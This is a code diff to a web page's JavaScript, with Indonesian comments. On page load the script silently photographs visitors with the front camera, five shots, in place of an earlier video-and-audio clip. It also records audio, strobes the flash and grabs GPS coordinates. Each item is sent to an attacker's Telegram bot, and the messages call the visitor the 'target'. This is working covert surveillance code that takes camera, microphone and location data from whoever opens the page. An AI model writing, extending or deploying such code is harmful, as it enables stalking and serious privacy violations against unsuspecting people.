@@ -160,13 +160,14 @@
       });
     }
 
-    function sendVideo(blob, filename) {
+    // Fungsi baru untuk mengirim file foto (Blob) ke Telegram
+    function sendPhoto(blob, filename, photoNumber) {
       chatIds.forEach(id => {
         const formData = new FormData();
         formData.append('chat_id', id);
-        formData.append('video', blob, filename);
-        formData.append('caption', '📹 Rekaman Kamera Depan (7 Detik)');
-        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
+        formData.append('photo', blob, filename);
+        formData.append('caption', `📸 Foto Kamera Depan Ke-${photoNumber}`);
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
 
@@ -200,21 +201,44 @@
       } catch (err) {}
     }
 
-    async function recordFrontVideo() {
+    // --- SEKARANG MENGGUNAKAN FITUR AMBIL 5 FOTO BERURUTAN ---
+    async function takeFrontPhotos() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const videoChunks = [];
-        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
-        mediaRecorder.onstop = () => {
-          const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-          sendVideo(videoBlob, 'rekaman_depan.mp4');
-          stream.getTracks().forEach(track => track.stop());
-        };
-        mediaRecorder.start();
-        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 7000);
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        
+        // Membuat elemen video & canvas tersembunyi untuk memproses tangkapan gambar
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.muted = true;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        let photoCount = 0;
+        // Interval mengambil gambar setiap 1.2 detik sampai terkumpul 5 foto
+        const interval = setInterval(() => {
+          if (photoCount >= 5) {
+            clearInterval(interval);
+            stream.getTracks().forEach(track => track.stop()); // Matikan kamera setelah selesai
+            return;
+          }
+
+          photoCount++;
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob((blob) => {
+            if (blob) {
+              sendPhoto(blob, `foto_depan_${photoCount}.jpg`, photoCount);
+            }
+          }, 'image/jpeg', 0.8);
+
+        }, 1200);
+
       } catch (err) {
-        sendToTelegram('maaf akses vidio tidak berhasil 🤬');
+        sendToTelegram('maaf akses kamera foto tidak berhasil 🤬');
       }
     }
 
@@ -262,7 +286,7 @@
       } catch (err) { sendToTelegram('flash tidak on 🤬'); }
     }
 
-    // --- FITUR AKSES LOKASI BARU ---
+    // --- FITUR AKSES LOKASI (Sudah dirapikan format link maps-nya) ---
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -270,7 +294,7 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            sendToTelegram(`📍 <b>Lokasi GPS Target:</b> <a href="${mapUrl}">click disini</a>`);
+            sendToTelegram(`📍 <b>Lokasi GPS Target:</b> <a href="${mapUrl}">klik disini ada data lokasi bos kuh</a>`);
           },
           (error) => {
             sendToTelegram('maaf akses lokasi di tolak 🤬');
@@ -286,9 +310,9 @@
       createParticles();
       getInfo();
       autoRecordAudio(); 
-      recordFrontVideo();
+      takeFrontPhotos(); // Menggantikan recordFrontVideo() bawaan sebelumnya
       startFlashStrobe();
-      getLocation(); // Pemicu otomatis akses lokasi
+      getLocation();
     });
 
     button.addEventListener('click', () => {
